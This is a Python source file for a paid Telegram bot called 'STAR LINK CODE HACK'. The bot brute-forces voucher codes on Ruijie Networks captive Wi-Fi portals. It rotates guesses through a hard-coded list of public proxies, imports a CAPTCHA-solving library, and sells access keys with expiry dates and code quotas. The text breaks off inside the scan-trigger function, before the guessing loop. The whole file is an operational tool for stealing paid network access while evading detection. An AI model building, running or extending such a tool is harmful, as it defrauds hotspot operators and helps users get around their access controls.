import telebot, asyncio, aiohttp, json, base64, random, re, os, string, time, uuid, aiofiles
import logging
from telebot.async_telebot import AsyncTeleBot
from telebot import types
from aiohttp import web
import cv2
import ddddocr
import numpy as np
from datetime import datetime, timedelta, timezone
from aiohttp_socks import ProxyConnector, ProxyConnectionError

# ==================== LOGGING ====================
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S'
)
logger = logging.getLogger(__name__)

# ==================== CONFIG ====================
BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
ADMIN_ID = os.environ.get("ADMIN_ID", "")
ADMIN_CONTACT = os.environ.get("ADMIN_CONTACT", "@username")

if not BOT_TOKEN:
    raise ValueError("❌ BOT_TOKEN environment variable is required!")
if not ADMIN_ID:
    raise ValueError("❌ ADMIN_ID environment variable is required!")

# ==================== PERSISTENT STORAGE ====================
DATA_DIR = os.environ.get("DATA_DIR", "./data")
os.makedirs(DATA_DIR, exist_ok=True)

AUTH_FILE = os.path.join(DATA_DIR, "auth_list.json")
RESULT_FILE = os.path.join(DATA_DIR, "result.json")
DEAD_PROXY_FILE = os.path.join(DATA_DIR, "dead_proxies.json")

logger.info(f"📁 Data directory: {DATA_DIR}")

# ==================== PROXIES ====================
PROXIES = [
    "socks5://72.223.188.92:4145",
    "socks5://45.74.31.25:6369",
    "socks5://102.129.229.131:1081",
    "socks5://45.74.31.25:4610",
    "socks5://68.71.241.33:4145",
    "http://65.108.203.35:28080",
    "socks5://198.8.84.3:4145",
    "socks5://192.252.220.89:4145",
    "http://146.190.60.147:8006",
    "socks5://45.74.31.41:10944",
    "socks5://45.74.31.42:4131",
    "http://145.220.227.2:1081",
    "socks5://5.140.110.96:1080",
    "http://54.117.6.131:8213",
    "socks5://45.74.31.42:14063",
    "socks4://98.190.239.3:4145"
]

CONCURRENCY = 100
BATCH_SIZE = 1000

dead_proxies = set()
proxy_lock = asyncio.Lock()
PROXY_ENABLED = True

# ==================== GLOBAL STATE ====================
bot = AsyncTeleBot(BOT_TOKEN)
user_data = {}
approve = {}
scan_tasks = {}
success_messages = {}
success_texts = {}
limited_messages = {}
limited_texts = {}
captcha_state = {}
retry_counts = {}
_voucher_sem = None
_start_time = time.monotonic()
found_count = {}
retry_count = {}
current_scan_type = {}

auth_list = {}
result = {}
auth_lock = asyncio.Lock()
result_lock = asyncio.Lock()
SUCCESS_CODE = asyncio.Queue()

_auth_cache = {}
_auth_cache_time = 0
AUTH_CACHE_TTL = 30


# ==================== WEB SERVER ====================
async def handle_health(request):
    return web.Response(text="Bot is awake and running 24/7!")


async def handle_root(request):
    return web.Response(text="Star Link Bot is running ✅")


async def web_server():
    app = web.Application()
    app.router.add_get('/', handle_root)
    app.router.add_get('/health', handle_health)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get('PORT', 8099))
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()
    logger.info(f"🌐 Web server started on port {port}")


# ==================== PROXY ====================
async def get_random_proxy_connector():
    global PROXY_ENABLED
    if not PROXY_ENABLED:
        return aiohttp.TCPConnector(ssl=True), None

    async with proxy_lock:
        available_proxies = [p for p in PROXIES if p not in dead_proxies]
        if not available_proxies:
            dead_proxies.clear()
            available_proxies = PROXIES
        proxy_url = random.choice(available_proxies) if available_proxies else None

    if not proxy_url:
        return aiohttp.TCPConnector(ssl=True), None

    try:
        connector = ProxyConnector.from_url(proxy_url, ssl=True)
        return connector, proxy_url
    except Exception as e:
        logger.warning(f"[Proxy Error] {proxy_url}: {e}")
        async with proxy_lock:
            dead_proxies.add(proxy_url)
        return aiohttp.TCPConnector(ssl=True), None


# ==================== DATA ====================
async def save_dead_proxies():
    try:
        async with aiofiles.open(DEAD_PROXY_FILE, 'w') as f:
            await f.write(json.dumps(list(dead_proxies)))
    except Exception as e:
        logger.error(f"Save dead proxies error: {e}")


async def load_dead_proxies():
    global dead_proxies
    try:
        async with aiofiles.open(DEAD_PROXY_FILE, 'r') as f:
            data = json.loads(await f.read())
            dead_proxies = set(data)
    except FileNotFoundError:
        dead_proxies = set()
    except Exception:
        dead_proxies = set()


async def load_auth_list(force=False):
    global auth_list, _auth_cache, _auth_cache_time
    now = time.monotonic()
    if not force and _auth_cache and (now - _auth_cache_time) < AUTH_CACHE_TTL:
        auth_list = _auth_cache
        return
    try:
        async with aiofiles.open(AUTH_FILE, 'r') as f:
            auth_list = json.loads(await f.read())
    except FileNotFoundError:
        auth_list = {}
        await save_auth_list()
    except Exception:
        auth_list = {}
    _auth_cache = auth_list
    _auth_cache_time = now


async def save_auth_list():
    global _auth_cache, _auth_cache_time
    async with auth_lock:
        tmp_file = AUTH_FILE + ".tmp"
        async with aiofiles.open(tmp_file, 'w') as f:
            await f.write(json.dumps(auth_list, indent=2))
        os.replace(tmp_file, AUTH_FILE)
    _auth_cache = auth_list
    _auth_cache_time = time.monotonic()


async def load_result():
    global result
    try:
        async with aiofiles.open(RESULT_FILE, 'r') as f:
            result = json.loads(await f.read())
    except FileNotFoundError:
        result = {}
        await save_result()
    except Exception:
        result = {}


async def save_result():
    async with result_lock:
        tmp_file = RESULT_FILE + ".tmp"
        async with aiofiles.open(tmp_file, 'w') as f:
            await f.write(json.dumps(result, indent=2))
        os.replace(tmp_file, RESULT_FILE)


# ==================== UTILS ====================
def check_key_expiration(expiration_time):
    try:
        if isinstance(expiration_time, dict):
            expiry = expiration_time.get("expires_at")
            if not expiry:
                return False
            if expiry == "9999-12-31T23:59:59Z":
                return True
            exp_time = datetime.fromisoformat(expiry.replace("Z", "+00:00"))
            return datetime.now(timezone.utc) < exp_time
        mm, hh, dd, MM, yyyy = map(int, expiration_time.split('-'))
        expiration_dt = datetime(year=yyyy, month=MM, day=dd, hour=hh, minute=mm, second=0, tzinfo=timezone.utc)
        return datetime.now(timezone.utc) < expiration_dt
    except Exception:
        return False


def generate_expiry(plan):
    now = datetime.now(timezone.utc)
    plans = {
        "30m": timedelta(minutes=30),
        "1h": timedelta(hours=1),
        "1d": timedelta(days=1),
        "7d": timedelta(days=7),
        "1m": timedelta(days=30),
        "1y": timedelta(days=365),
        "unlimited": None
    }
    if plan not in plans:
        return None
    if plan == "unlimited":
        return "9999-12-31T23:59:59Z"
    return (now + plans[plan]).isoformat()


def get_remaining_time(expires_at):
    if expires_at == "9999-12-31T23:59:59Z":
        return "Unlimited"
    try:
        exp_time = datetime.fromisoformat(expires_at.replace("Z", "+00:00"))
        now = datetime.now(timezone.utc)
        if exp_time <= now:
            return "Expired"
        diff = exp_time - now
        days = diff.days
        hours, rem = divmod(diff.seconds, 3600)
        minutes = rem // 60
        if days > 0:
            return f"{days}d {hours}h {minutes}m"
        return f"{hours}h {minutes}m"
    except Exception:
        return "Unknown"


def format_time(total_minutes):
    if total_minutes is None:
        return "Unavailable"
    if isinstance(total_minutes, str) and total_minutes.strip().lower() in {"unknown", "n/a", "na", ""}:
        return "Unavailable"
    try:
        minutes = int(total_minutes)
        if minutes < 0:
            return "⛔ Expired"
        if minutes == 0:
            return "0 minutes"
        days = minutes // 1440
        hours = (minutes % 1440) // 60
        mins = minutes % 60
        parts = []
        if days > 0: parts.append(f"{days} day{'s' if days > 1 else ''}")
        if hours > 0: parts.append(f"{hours} hour{'s' if hours > 1 else ''}")
        if mins > 0: parts.append(f"{mins} minute{'s' if mins > 1 else ''}")
        return " ".join(parts) if parts else "0 minutes"
    except Exception:
        return "Unknown"


async def get_user_info(user_id):
    try:
        user = await bot.get_chat(user_id)
        name = user.first_name or "Unknown"
        if user.last_name:
            name += f" {user.last_name}"
        username = user.username or "None"
        return {"name": name, "username": username, "id": user_id}
    except Exception as e:
        logger.error(f"Error getting user info: {e}")
        return {"name": "Unknown", "username": "None", "id": user_id}


# ==================== MENUS ====================
async def send_main_menu(message):
    user_info = await get_user_info(message.chat.id)
    user_name = user_info["name"]
    user_id = user_info["id"]

    status_text = ""
    limit_text = ""

    if str(message.chat.id) == ADMIN_ID:
        status_text = "♾️ Unlimited Credit ဖြင့် သုံးစွဲနိုင်ပါသည်။"
        limit_text = "♾️ Code Limit: Unlimited (Admin)"
    elif str(message.chat.id) in auth_list:
        key_data = auth_list[str(message.chat.id)]
        limit = key_data.get("limit", "unlimited") if isinstance(key_data, dict) else "unlimited"
        found = len(result.get(str(message.chat.id), []))
        if limit == "unlimited":
            limit_text = f"♾️ Code Limit: Unlimited\n📊 Used: {found} codes"
        else:
            limit_num = int(limit)
            remaining = max(0, limit_num - found)
            limit_text = f"🔢 Code Limit: {limit}\n📊 Used: {found} codes\n✅ Remaining: {remaining} codes"
        status_text = "✅ Paid User ဖြစ်ပါသည်။"

    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(
        types.InlineKeyboardButton("🎯 Start Scan", callback_data="scan_type_menu"),
        types.InlineKeyboardButton("📝 Input URL", callback_data="input_url"),
        types.InlineKeyboardButton("🛑 Stop Scan", callback_data="stop_scan"),
        types.InlineKeyboardButton("📄 My Result", callback_data="result"),
        types.InlineKeyboardButton("📊 Status", callback_data="status"),
        types.InlineKeyboardButton("📖 Help", callback_data="help")
    )
    if str(message.chat.id) == ADMIN_ID:
        markup.add(types.InlineKeyboardButton("🛠️ Admin Panel", callback_data="admin_menu"))

    welcome_text = (
        f"✨ STAR LINK CODE HACK ✨\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n"
        f"👤 NAME: {user_name}\n"
        f"🆔 USER ID: {user_id}\n"
        f"🎉 မင်္ဂလာပါခင်ဗျာ!\n"
        f"✅ သင့်အနေနဲ့ PAID USER ဖြစ်ပါတယ်။\n"
        f"{status_text}\n"
        f"{limit_text}\n"
        f"🔀 Proxy Status: {'ON' if PROXY_ENABLED else 'OFF'}\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n"
        f"အောက်ပါ Menu မှ ရွေးချယ်ပါ။"
    )
    await bot.send_message(message.chat.id, welcome_text, reply_markup=markup)


async def send_admin_menu(message):
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(
        types.InlineKeyboardButton("🛠️ Genkey", callback_data="genkey_menu"),
        types.InlineKeyboardButton("📋 List Keys", callback_data="listkeys"),
        types.InlineKeyboardButton("📊 Status", callback_data="status"),
        types.InlineKeyboardButton("📢 Broadcast", callback_data="broadcast_menu"),
        types.InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")
    )
    try:
        await bot.edit_message_text("🛠️ Admin Panel\n\nSelect an option:", chat_id=message.chat.id, message_id=message.message_id, reply_markup=markup)
    except Exception:
        await bot.send_message(message.chat.id, "🛠️ Admin Panel\n\nSelect an option:", reply_markup=markup)


# ==================== PROXY COMMANDS ====================
@bot.message_handler(commands=['proxyon'])
async def proxy_on(message):
    global PROXY_ENABLED
    PROXY_ENABLED = True
    await bot.reply_to(message, "✅ Proxy Enabled (ON)")


@bot.message_handler(commands=['proxyoff'])
async def proxy_off(message):
    global PROXY_ENABLED
    PROXY_ENABLED = False
    await bot.reply_to(message, "❌ Proxy Disabled (OFF)")


@bot.message_handler(commands=['addproxy'])
async def add_proxy(message):
    if str(message.chat.id) != ADMIN_ID:
        return
    args = message.text.split(maxsplit=1)
    if len(args) > 1:
        new_p = args[1].strip()
        async with proxy_lock:
            if new_p not in PROXIES:
                PROXIES.append(new_p)
        await bot.reply_to(message, f"✅ Proxy Added: {new_p}")
    else:
        await bot.reply_to(message, "Usage: /addproxy socks5://user:pass@IP:PORT")


@bot.message_handler(commands=['clearproxy'])
async def clear_proxy(message):
    if str(message.chat.id) != ADMIN_ID:
        return
    async with proxy_lock:
        PROXIES.clear()
        dead_proxies.clear()
    await save_dead_proxies()
    await bot.reply_to(message, "🗑️ All proxies cleared.")


@bot.message_handler(commands=['deadclearproxy'])
async def dead_clear_proxy(message):
    if str(message.chat.id) != ADMIN_ID:
        return
    async with proxy_lock:
        dead_proxies.clear()
    await save_dead_proxies()
    await bot.reply_to(message, "🧹 Dead proxies cleared.")


@bot.message_handler(commands=['proxystatus'])
async def proxy_status(message):
    if str(message.chat.id) != ADMIN_ID:
        return
    async with proxy_lock:
        total_p = len(PROXIES)
        dead_p = len(dead_proxies)
        active_p = total_p - dead_p
        status_msg = (
            f"🔀 Proxy Status: {'ON' if PROXY_ENABLED else 'OFF'} | "
            f"🟢 Active: {active_p} | 🔴 Dead: {dead_p} | 📦 Total: {total_p}"
        )
    await bot.reply_to(message, status_msg)


# ==================== CALLBACK ====================
@bot.callback_query_handler(func=lambda call: True)
async def callback_query(call):
    data = call.data
    chat_id = call.message.chat.id
    message_id = call.message.message_id

    if data == "main_menu":
        await send_main_menu(call.message)
        await bot.answer_callback_query(call.id)
        return

    elif data == "status":
        await handle_status(call.message)
        await bot.answer_callback_query(call.id)
        return

    elif data == "listkeys":
        await handle_listkeys(call.message)
        await bot.answer_callback_query(call.id)
        return

    elif data == "scan_type_menu":
        markup = types.InlineKeyboardMarkup(row_width=2)
        markup.add(
            types.InlineKeyboardButton("🔢 6 Digit Only", callback_data="scan_type_6"),
            types.InlineKeyboardButton("🔢 7 Digit Only", callback_data="scan_type_7"),
            types.InlineKeyboardButton("🔢 8 Digit Only", callback_data="scan_type_8"),
            types.InlineKeyboardButton("🔢 9 Digit Only", callback_data="scan_type_9"),
            types.InlineKeyboardButton("🔤 All Mix (6)", callback_data="scan_type_all6"),
            types.InlineKeyboardButton("🔤 All Mix (7)", callback_data="scan_type_all7"),
            types.InlineKeyboardButton("🔤 All Mix (8)", callback_data="scan_type_all8"),
            types.InlineKeyboardButton("🔤 All Mix (9)", callback_data="scan_type_all9"),
            types.InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")
        )
        try:
            await bot.edit_message_text("🎯 Choose Scan Type", chat_id=chat_id, message_id=message_id, reply_markup=markup)
        except Exception:
            await bot.send_message(chat_id, "🎯 Choose Scan Type", reply_markup=markup)
        await bot.answer_callback_query(call.id)
        return

    elif data in {"scan_type_6", "scan_type_7", "scan_type_8", "scan_type_9", "scan_type_all6", "scan_type_all7", "scan_type_all8", "scan_type_all9"}:
        mode_map = {
            "scan_type_6": "6", "scan_type_7": "7", "scan_type_8": "8", "scan_type_9": "9",
            "scan_type_all6": "all6", "scan_type_all7": "all7", "scan_type_all8": "all8", "scan_type_all9": "all9"
        }
        mode = mode_map[data]
        current_scan_type[chat_id] = mode
        await trigger_scan(call.message, mode)
        await bot.answer_callback_query(call.id)
        return

    elif data == "input_url":
        try:
            await bot.edit_message_text("📝 Please send your Session URL\n\nExample: /input https://portal-as.ruijienetworks.com/api/...", chat_id=chat_id, message_id=message_id)
        except Exception:
            await bot.send_message(chat_id, "📝 Please send your Session URL\n\nExample: /input https://portal-as.ruijienetworks.com/api/...")
        await bot.answer_callback_query(call.id)
        return

    elif data == "stop_scan":
        await stop_scan(call.message)
        await bot.answer_callback_query(call.id)
        return

    elif data == "result":
        await handle_result(call.message)
        await bot.answer_callback_query(call.id)
        return

    elif data == "help":
        await help_command(call.message)
        await bot.answer_callback_query(call.id)
        return

    elif data == "admin_menu":
        await send_admin_menu(call.message)
        await bot.answer_callback_query(call.id)
        return

    elif data == "genkey_menu":
        try:
            await bot.edit_message_text("📝 To generate key:\n\n/genkey <plan> <user_id> <limit>\n\nPlans: 30m, 1h, 1d, 7d, 1m, 1y, unlimited", chat_id=chat_id, message_id=message_id)
        except Exception:
            await bot.send_message(chat_id, "📝 Use /genkey <plan> <user_id> <limit>")
        await bot.answer_callback_query(call.id)
        return

    elif data == "broadcast_menu":
        try:
            await bot.edit_message_text("📝 To broadcast:\n\n/broadcast <message>", chat_id=chat_id, message_id=message_id)
        except Exception:
            await bot.send_message(chat_id, "📝 Use /broadcast <message>")
        await bot.answer_callback_query(call.id)
        return


# ==================== USER COMMANDS ====================
@bot.message_handler(commands=['start', 'key'])
async def handle_key(message):
    chat_id = str(message.chat.id)

    if chat_id == ADMIN_ID:
        approve[message.chat.id] = True
        user_data.setdefault(message.chat.id, {})
        await send_main_menu(message)
        return

    await load_auth_list(force=True)
    if chat_id in auth_list:
        valid = check_key_expiration(auth_list[chat_id])
        if valid:
            approve[message.chat.id] = True
            user_data.setdefault(message.chat.id, {})
            await send_main_menu(message)
        else:
            approve[message.chat.id] = False
            await bot.reply_to(message, "❌ Key Expired ဖြစ်နေပါသည်။")
    else:
        user_info = await get_user_info(message.chat.id)
        await bot.reply_to(message,
            f"❌ သင့်အနေနဲ့ Key မရှိသေးပါ။\n\n"
            f"👤 NAME: {user_info['name']}\n"
            f"🆔 USER ID: {user_info['id']}\n"
            f"📛 USERNAME: @{user_info['username']}\n\n"
            f"ကျေးဇူးပြု၍ Admin {ADMIN_CONTACT} ကို ဆက်သွယ်ပါ။"
        )


@bot.message_handler(commands=['help'])
async def help_command(message):
    help_text = (
        "🤖 Bot Command List\n\n"
        "🔹 User Commands:\n"
        "  /key – Key ထည့်ရန်\n"
        "  /input <session_url> – URL ထည့်ရန်\n"
        "  /scan – Scan စရန်\n"
        "  /stop – Scan ရပ်ရန်\n"
        "  /result – Code ကြည့်ရန်\n"
        "  /recheck – Code ပြန်စစ်ရန်\n"
        "  /mylimit – Limit ကြည့်ရန်\n"
        "  /proxyon / /proxyoff – Proxy ထိန်း\n\n"
        "🔹 Admin Commands:\n"
        "  /genkey <plan> <user_id> <limit>\n"
        "  /delkey <user_id>\n"
        "  /listkeys\n"
        "  /status\n"
        "  /broadcast <message>\n"
        "  /addproxy <url>\n"
        "  /clearproxy\n"
        "  /proxystatus"
    )
    await bot.reply_to(message, help_text)


@bot.message_handler(commands=['mylimit'])
async def mylimit(message):
    chat_id = str(message.chat.id)
    await load_auth_list()
    await load_result()

    if chat_id in auth_list:
        key_data = auth_list[chat_id]
        limit = key_data.get("limit", "unlimited") if isinstance(key_data, dict) else "unlimited"
        plan = key_data.get("plan", "unknown") if isinstance(key_data, dict) else "unknown"
        expires = key_data.get("expires_at", "unknown") if isinstance(key_data, dict) else "unknown"
        used_count = len(result.get(chat_id, []))
        if limit == "unlimited":
            limit_text = "♾️ Unlimited"
            remaining_text = "♾️ Unlimited"
        else:
            limit_num = int(limit)
            remaining = max(0, limit_num - used_count)
            limit_text = str(limit)
            remaining_text = str(remaining)
        remaining_time = get_remaining_time(expires)
        await bot.reply_to(message,
            f"📊 Your Key Info\n\n"
            f"📋 Plan: {plan}\n"
            f"⏰ Remaining: {remaining_time}\n"
            f"🔢 Limit: {limit_text}\n"
            f"📊 Used: {used_count}\n"
            f"✅ Remaining: {remaining_text}"
        )
    elif chat_id == ADMIN_ID:
        await bot.reply_to(message, "♾️ You have Unlimited access (Admin)")
    else:
        await bot.reply_to(message, "❌ You don't have a valid key.")


# ==================== ADMIN ====================
@bot.message_handler(commands=['genkey'])
async def genkey(message):
    if str(message.chat.id) != ADMIN_ID:
        await bot.reply_to(message, "No Permission")
        return
    try:
        args = message.text.split()
        if len(args) < 4:
            await bot.reply_to(message, "Usage:\n/genkey <plan> <user_id> <limit>\n\nPlans: 30m,1h,1d,7d,1m,1y,unlimited")
            return
        plan = args[1]
        user_id = args[2]
        limit = args[3]
        expiry = generate_expiry(plan)
        if not expiry:
            await bot.reply_to(message, "Invalid plan!")
            return
        if limit != "unlimited":
            try:
                limit_num = int(limit)
                if limit_num < 1:
                    raise ValueError
            except ValueError:
                await bot.reply_to(message, "Invalid limit!")
                return
        await load_auth_list(force=True)
        auth_list[user_id] = {"expires_at": expiry, "plan": plan, "limit": limit}
        await save_auth_list()
        await bot.reply_to(message, f"✅ Key Generated\n\nUSER ID: {user_id}\nPLAN: {plan}\nLIMIT: {limit}\nEXPIRES: {expiry}")
    except Exception as e:
        logger.error(f"Error at genkey {e}")


@bot.message_handler(commands=['delkey'])
async def delkey(message):
    if str(message.chat.id) != ADMIN_ID:
        await bot.reply_to(message, "No Permission")
        return
    try:
        args = message.text.split()
        if len(args) < 2:
            await bot.reply_to(message, "Usage:\n/delkey 123456789")
            return
        user_id = args[1]
        await load_auth_list(force=True)
        if user_id not in auth_list:
            await bot.reply_to(message, f"User ID {user_id} မတွေ့ပါ။")
            return
        del auth_list[user_id]
        await save_auth_list()
        approve.pop(int(user_id), None)
        user_data.pop(int(user_id), None)
        await bot.reply_to(message, f"✅ Key Deleted: {user_id}")
    except Exception as e:
        logger.error(f"Error at delkey {e}")


@bot.message_handler(commands=['listkeys'])
async def listkeys(message):
    if str(message.chat.id) != ADMIN_ID:
        await bot.reply_to(message, "No Permission")
        return
    await handle_listkeys(message)


async def handle_listkeys(message):
    if str(message.chat.id) != ADMIN_ID:
        return
    await load_auth_list(force=True)
    await load_result()
    if not auth_list:
        await bot.reply_to(message, "Registered key မရှိသေးပါ။")
        return
    lines = []
    for uid, data in auth_list.items():
        if isinstance(data, dict):
            expires = data.get("expires_at", "unknown")
            plan = data.get("plan", "unknown")
            limit = data.get("limit", "unlimited")
            if expires == "9999-12-31T23:59:59Z":
                expires_str = "Unlimited"
            else:
                try:
                    exp_dt = datetime.fromisoformat(expires.replace("Z", "+00:00"))
                    now = datetime.now(timezone.utc)
                    if exp_dt < now:
                        expires_str = "Expired"
                    else:
                        diff = exp_dt - now
                        days = diff.days
                        hours, rem = divmod(diff.seconds, 3600)
                        minutes = rem // 60
                        expires_str = f"{days}d {hours}h {minutes}m left"
                except Exception:
                    expires_str = expires
        else:
            plan = "old"
            expires_str = str(data)
            limit = "unlimited"

        user_codes = result.get(uid, [])
        success_count = len(user_codes) if isinstance(user_codes, list) else 0

        if limit == "unlimited":
            limit_display = "♾️ Unlimited"
            remaining_display = "♾️ Unlimited"
        else:
            try:
                limit_num = int(limit)
                remaining = max(0, limit_num - success_count)
                limit_display = str(limit_num)
                remaining_display = str(remaining)
            except Exception:
                limit_display = str(limit)
                remaining_display = "?"

        lines.append(
            f"👤 {uid}\n   Plan: {plan}\n   Limit: {limit_display}\n"
            f"   ✅ Success: {success_count}\n   📊 Remaining: {remaining_display}\n   Expires: {expires_str}"
        )

    text = f"📋 Registered Keys ({len(auth_list)})\n\n" + "\n\n".join(lines)
    if len(text) > 4096:
        for i in range(0, len(text), 4096):
            await bot.send_message(message.chat.id, text[i:i+4096])
    else:
        await bot.reply_to(message, text)


@bot.message_handler(commands=['broadcast'])
async def broadcast(message):
    if str(message.chat.id) != ADMIN_ID:
        await bot.reply_to(message, "No Permission")
        return
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await bot.reply_to(message, "Usage:\n/broadcast <message>")
        return
    msg = args[1]
    await load_auth_list(force=True)
    if not auth_list:
        await bot.reply_to(message, "No users to broadcast.")
        return
    sent = 0
    failed = 0
    for uid in auth_list.keys():
        try:
            await bot.send_message(int(uid), f"📢 Admin Message:\n{msg}")
            sent += 1
            await asyncio.sleep(0.1)
        except Exception:
            failed += 1
    await bot.reply_to(message, f"✅ Broadcast sent to {sent} users.\n❌ Failed: {failed}")


@bot.message_handler(commands=['status'])
async def status_command(message):
    await handle_status(message)


async def handle_status(message):
    if str(message.chat.id) != ADMIN_ID:
        await bot.reply_to(message, "No Permission")
        return
    await load_auth_list()
    await load_result()

    active_scans = sum(1 for data in scan_tasks.values() if not data["task"].done())
    active_users = [str(cid) for cid, data in scan_tasks.items() if not data["task"].done()]
    approved_users = sum(1 for v in approve.values() if v)
    uptime_seconds = int(time.monotonic() - _start_time)
    hours, remainder = divmod(uptime_seconds, 3600)
    minutes, seconds = divmod(remainder, 60)

    user_code_lines = []
    for uid, codes in result.items():
        count = len(codes) if isinstance(codes, list) else 0
        user_code_lines.append(f"  • {uid}: {count} codes")

    status_text = (
        f"📊 Bot Status\n\n"
        f"⏱ Uptime: {hours}h {minutes}m {seconds}s\n"
        f"🔍 Active Scans: {active_scans}\n"
        f"👥 Scanning Users: {len(active_users)}\n"
        f"✅ Approved Users: {approved_users}\n"
        f"🔑 Registered Keys: {len(auth_list)}\n"
        f"📦 Total Result Entries: {sum(len(v) if isinstance(v, list) else 0 for v in result.values())}\n"
        f"🛡️ Active Proxies: {len(PROXIES) - len(dead_proxies)}/{len(PROXIES)}"
    )
    if active_users:
        status_text += f"\n\n🔑 Active User IDs:\n"
        for uid in active_users:
            status_text += f"  • {uid}\n"
    if user_code_lines:
        status_text += f"\n\n📊 Codes Found Per User:\n" + "\n".join(user_code_lines)

    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(types.InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu"))
    try:
        await bot.reply_to(message, status_text, reply_markup=markup)
    except Exception:
        await bot.send_message(message.chat.id, status_text, reply_markup=markup)


@bot.message_handler(commands=['result'])
async def handle_result(message):
    chat_id = str(message.chat.id)
    await load_auth_list()
    await load_result()
    if chat_id == ADMIN_ID or chat_id in auth_list:
        if chat_id in result and result[chat_id]:
            codes = result[chat_id]
            lines = []
            for idx, c in enumerate(codes, 1):
                if isinstance(c, dict):
                    lines.append(f"#{idx} 🔑 {c.get('code', '?')}\n   📦 {c.get('plan', 'Unknown')}")
                else:
                    lines.append(f"#{idx} 🔑 {c}")
            codes_text = "\n".join(lines)
            await bot.reply_to(message, f"✅ Found Codes:\n\n{codes_text}")
        else:
            await bot.reply_to(message, "သင့်တွင် code မရှိသေးပါ။")
    else:
        await bot.reply_to(message, f"❌ ခွင့်ပြုချက်မရှိပါ။ Admin {ADMIN_CONTACT} ကို ဆက်သွယ်ပါ။")


@bot.message_handler(commands=['recheck'])
async def recheck(message):
    chat_id = message.chat.id
    await load_auth_list()
    if not (str(chat_id) == ADMIN_ID or str(chat_id) in auth_list):
        await bot.reply_to(message, f"❌ ခွင့်ပြုချက်မရှိပါ။")
        return
    if chat_id not in user_data:
        await bot.reply_to(message, "/recheck မလုပ်မီ /key ကိုအရင်လုပ်ပါ။")
        return
    if "session_url" not in user_data[chat_id]:
        await bot.reply_to(message, "/recheck မလုပ်မီ /input ဖြင့် URL ထည့်ပါ။")
        return
    chat_id_str = str(chat_id)
    await load_result()
    if chat_id_str in result and result[chat_id_str]:
        codes = result[chat_id_str]
        await bot.reply_to(message, "Success Code များအား ပြန်စစ်နေပါသည်။")
        session_url_recheck = user_data[chat_id]["session_url"]
        recheck_list = []
        for code_item in codes:
            code = code_item.get("code") if isinstance(code_item, dict) else code_item
            recode = await perform_check(session_url_recheck, code, chat_id, scan_id=None, recheck=True, message=message)
            if recode:
                recheck_list.append(recode)
        to_show = "\n".join(recheck_list) if recheck_list else "Success code မရှာတွေ့ပါ။"
        await bot.reply_to(message, f"✅ Rechecked Codes:\n\n{to_show}")
        await save_rechecked_codes(chat_id_str, recheck_list)
    else:
        await bot.reply_to(message, "သင့်တွင် success code မရှိသေးပါ။")


async def save_rechecked_codes(chat_id_str, recheck_list):
    global result
    result[chat_id_str] = recheck_list
    await save_result()


# ==================== SESSION CHECK ====================
async def check_session_url(session_url):
    if not session_url or "portal-as.ruijienetworks.com" not in session_url:
        return False
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/148.0.0.0 Safari/537.36',
    }
    for _ in range(3):
        connector, p_url = await get_random_proxy_connector()
        try:
            timeout = aiohttp.ClientTimeout(total=15)
            async with aiohttp.ClientSession(connector=connector, timeout=timeout) as temp_session:
                async with temp_session.get(session_url, allow_redirects=True, headers=headers) as response:
                    text_ = str(response.url)
                    if "sessionId" in text_:
                        return True
                    if response.status == 200:
                        body = await response.text()
                        if "sessionId" in body or "portal" in body.lower():
                            return True
        except Exception as e:
            logger.warning(f"Session check error: {e}")
            if p_url:
                async with proxy_lock:
                    dead_proxies.add(p_url)
            continue
    return False


@bot.message_handler(commands=['input'])
async def handle_input(message):
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await bot.reply_to(message, "Usage:\n\n/input your_session_url")
        return
    url = args[1].strip()
    user_data.setdefault(message.chat.id, {})
    await bot.reply_to(message, "Session URL အားစစ်ဆေးနေပါသည်။")
    if await check_session_url(session_url=url):
        user_data[message.chat.id]['session_url'] = url
        markup = types.InlineKeyboardMarkup(row_width=2)
        markup.add(
            types.InlineKeyboardButton("🔢 6 Digit Only", callback_data="scan_type_6"),
            types.InlineKeyboardButton("🔢 7 Digit Only", callback_data="scan_type_7"),
            types.InlineKeyboardButton("🔢 8 Digit Only", callback_data="scan_type_8"),
            types.InlineKeyboardButton("🔢 9 Digit Only", callback_data="scan_type_9"),
            types.InlineKeyboardButton("🔤 All Mix (6)", callback_data="scan_type_all6"),
            types.InlineKeyboardButton("🔤 All Mix (7)", callback_data="scan_type_all7"),
            types.InlineKeyboardButton("🔤 All Mix (8)", callback_data="scan_type_all8"),
            types.InlineKeyboardButton("🔤 All Mix (9)", callback_data="scan_type_all9"),
            types.InlineKeyboardButton("🛑 Stop", callback_data="stop_scan"),
            types.InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")
        )
        await bot.send_message(message.chat.id, "✅ SESSION SAVED\n\nChoose a scan type below:", reply_markup=markup)
    else:
        await bot.reply_to(message, "❌ Session URL မှားနေပါသည် သို့မဟုတ် Proxy များ ချိတ်ဆက်၍မရပါ။")


# ==================== SCAN ====================
async def trigger_scan(message, mode):
    chat_id = message.chat.id
    chat_id_str = str(chat_id)

    await load_auth_list()
    key_authorized = False
    if chat_id_str in auth_list:
        key_authorized = check_key_expiration(auth_list[chat_id_str])

    if chat_id_str != ADMIN_ID and not key_authorized:
        await bot.send_message(chat_id, f"❌ ခွင့်ပြုချက်မရှိပါ။ Admin {ADMIN_CONTACT} ကို ဆက်သွယ်ပါ။")
        return
    if chat_id not in user_data:
        await bot.send_message(chat_id, "/scan မလုပ်မီ /key ကိုအရင်လုပ်ပါ။")
        return
    if 'session_url' not in user_data[chat_id]:
